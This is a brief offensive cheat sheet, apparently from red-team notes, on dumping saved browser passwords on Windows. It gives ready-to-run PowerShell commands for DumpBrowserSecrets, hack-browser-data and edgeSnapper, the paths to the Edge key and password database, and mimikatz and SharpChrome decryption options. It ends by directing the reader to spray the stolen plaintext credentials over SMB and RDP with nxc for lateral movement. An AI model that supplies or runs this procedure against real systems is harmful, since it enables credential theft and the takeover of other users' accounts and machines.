# Browser Credential Extraction

Chromium-based browsers (Chrome, Edge, Brave) store saved passwords in an SQLite DB encrypted with a DPAPI-protected AES key. With a user-level shell, decrypt using tools that call DPAPI inline.

```powershell
# DumpBrowserSecrets (runs in-session, no DPAPI export needed)
.\DumpBrowserSecrets.exe

# hack-browser-data (cross-platform, outputs CSV)
.\hack-browser-data.exe -b chrome -o .
```

Microsoft Edge specifically: if a session is active (user is logged in), the AES key is available in-memory. edgeSnapper dumps it from the process:
```powershell
.\edgeSnapper.exe   # requires the Edge process to be running — use when an RDP session is active
```

Manual approach (if tools are blocked):
```powershell
# Key is in %LOCALAPPDATA%\Microsoft\Edge\User Data\Local State, base64-encoded after DPAPI prefix
# DB is at %LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data
# Use mimikatz dpapi::chrome or SharpChrome for offline decryption
```

Collected plaintext credentials → spray via `nxc smb`/`nxc rdp` for lateral movement.
